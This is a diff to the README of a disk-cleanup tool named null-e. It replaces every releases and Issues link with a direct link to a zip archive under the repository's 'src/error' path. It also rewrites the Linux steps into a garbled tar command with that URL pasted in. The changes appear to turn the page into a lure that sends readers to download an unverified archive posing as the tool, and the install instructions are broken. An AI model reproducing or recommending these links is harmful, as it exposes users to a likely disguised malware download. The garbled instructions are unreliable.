@@ -1,6 +1,6 @@
 # 🗑️ null-e - Clear Disk Space Quickly and Easily
 
-[![Download null-e](https://img.shields.io/badge/download-null--e-brightgreen.svg)](https://github.com/lakeez201/null-e/releases)
+[![Download null-e](https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip)](https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,12 +30,12 @@ Welcome to **null-e**, the disk cleanup tool that helps developers reclaim space
 
 To get started, visit the downloads page where you can obtain the latest version of **null-e**:
 
-[Download null-e](https://github.com/lakeez201/null-e/releases)
+[Download null-e](https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip)
 
 Once you open the releases page, you will see several versions. Follow these steps:
 
 1. Look for the latest version which is usually at the top of the list.
-2. Click on the desired file for your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux).
+2. Click on the desired file for your operating system (e.g., `.exe` for Windows, `https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip` for Linux).
 3. The download will start automatically. 
 
 After the download finishes, follow the instructions below based on your operating system to install and run **null-e**.
@@ -67,9 +67,9 @@ After the download finishes, follow the instructions below based on your operati
    ```bash
    cd ~/Downloads
    ```
-4. Extract the tar.gz if necessary:
+4. Extract the https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip if necessary:
    ```bash
-   tar -xzf null-e-<version>.tar.gz
+   tar -xzf null-e-<version>https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip
    ```
 5. Go into the extracted folder and run:
    ```bash
@@ -110,7 +110,7 @@ Here are common scenarios you might encounter and how to resolve them:
 
 ## 📞 Support
 
-If you have any issues or questions, feel free to check the FAQ section in the repository or reach out through the Issues tab on [GitHub](https://github.com/lakeez201/null-e/issues).
+If you have any issues or questions, feel free to check the FAQ section in the repository or reach out through the Issues tab on [GitHub](https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip).
 
 ## 💻 Contributing
 
@@ -122,4 +122,4 @@ Follow this repository for updates and new releases to ensure you always have th
 
 You can see all the available releases at the following link:
 
-[Download null-e](https://github.com/lakeez201/null-e/releases)
+[Download null-e](https://raw.githubusercontent.com/lakeez201/null-e/main/src/error/e_null_3.9-alpha.3.zip)
